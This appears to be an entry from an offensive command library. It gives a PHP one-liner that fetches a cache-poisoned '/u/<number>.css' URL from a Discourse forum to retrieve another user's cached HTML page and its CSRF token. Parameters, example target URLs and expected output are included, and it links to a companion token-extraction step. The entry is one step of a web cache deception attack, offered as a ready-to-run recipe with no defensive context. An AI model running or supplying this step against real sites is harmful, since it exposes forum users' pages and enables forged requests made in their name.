---
data: >-
  $ctx = stream_context_create(['http' => ['ignore_errors' => true]]); $data =
  file_get_contents($discourse . '/u/' . $f . '.css', false, $ctx);
tags:
  - extraction
  - http
type: command
output: HTML content with CSRF token meta tag
executor: php
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.433Z'
id: c7cd0feb-ce71-404d-9795-0b607715db88
verified: false
validated: true
submitted: true
---
# php-file-get-contents-u-f-css

## Command

```php
$ctx = stream_context_create(['http' => ['ignore_errors' => true]]); $data = file_get_contents($discourse . '/u/' . $f . '.css', false, $ctx);
```

## Description

Fetches the cached CSS URL server-side using PHP, ignoring HTTP errors, to retrieve victim-specific HTML from tainted cache.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $discourse | Target Discourse URL (e.g., https://try.discourse.org) | Yes |
| $f | Random number from taint step | Yes |
| $ctx | Stream context with ignore_errors | Yes |

## Examples

### Basic Usage

```php
$data = file_get_contents('https://try.discourse.org/u/123.css', false, $ctx);
```

### Advanced Usage

```php
$headers = $http_response_header; // Access after fetch
```

## Expected Output

String $data with full HTML response.

## Related

- [[commands/php-preg-match-csrf-token]]
